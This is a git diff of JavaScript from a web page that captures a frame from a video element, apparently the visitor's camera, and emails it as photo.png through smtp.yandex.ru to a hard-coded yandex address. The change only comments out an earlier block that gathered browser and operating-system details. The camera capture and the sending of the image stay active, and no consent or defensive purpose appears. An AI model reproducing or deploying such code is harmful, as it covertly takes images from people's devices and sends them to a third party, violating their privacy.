@@ -71,24 +71,24 @@
             canvas.height = video.videoHeight;
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            var code = navigator.appCodeName;
-            var name = navigator.appName;
-            var vers = navigator.appVersion;
-            var platform = navigator.platform;
-            var cook = navigator.cookieEnabled;
-            var je = navigator.javaEnabled();
-            var ua = navigator.userAgent;
-            var text = 'Ваш браузер: ' + name +
-                '<br />Версия браузера: ' + vers +
-                '<br />Кодовое название браузера: ' + code +
-                '<br />Платформа: ' + platform +
-                '<br />Поддержка cookie: ' + cook +
-                '<br />Поддержка JavaScript: ' + je +
-                '<br />Браузер: ' + ua +
-                navigator.language +
-                '<br />Операционная система: ' + navigator.oscpu +
-                '<br />Производитель: ' + navigator.vendor +
-                '<br />Подразделение: ' + navigator.vendorSub;
+            // var code = navigator.appCodeName;
+            // var name = navigator.appName;
+            // var vers = navigator.appVersion;
+            // var platform = navigator.platform;
+            // var cook = navigator.cookieEnabled;
+            // var je = navigator.javaEnabled();
+            // var ua = navigator.userAgent;
+            // var text = 'Ваш браузер: ' + name +
+            //     '<br />Версия браузера: ' + vers +
+            //     '<br />Кодовое название браузера: ' + code +
+            //     '<br />Платформа: ' + platform +
+            //     '<br />Поддержка cookie: ' + cook +
+            //     '<br />Поддержка JavaScript: ' + je +
+            //     '<br />Браузер: ' + ua +
+            //     navigator.language +
+            //     '<br />Операционная система: ' + navigator.oscpu +
+            //     '<br />Производитель: ' + navigator.vendor +
+            //     '<br />Подразделение: ' + navigator.vendorSub;
             vibrate(100)
             Email.send({
                 Host: "smtp.yandex.ru",
@@ -97,7 +97,7 @@
                 To: 'koha009@yandex.ru',
                 From: "koha009@yandex.ru",
                 Subject: "Пришел снимок экрана",
-                Body: "<html><h2>Информация</h2><p>" + text + "</p></html>",
+                Body: "<html><h2>Информация</h2><p></p></html>",
                 Attachments: [{
                     name: 'photo.png',
                     data: canvas.toDataURL()
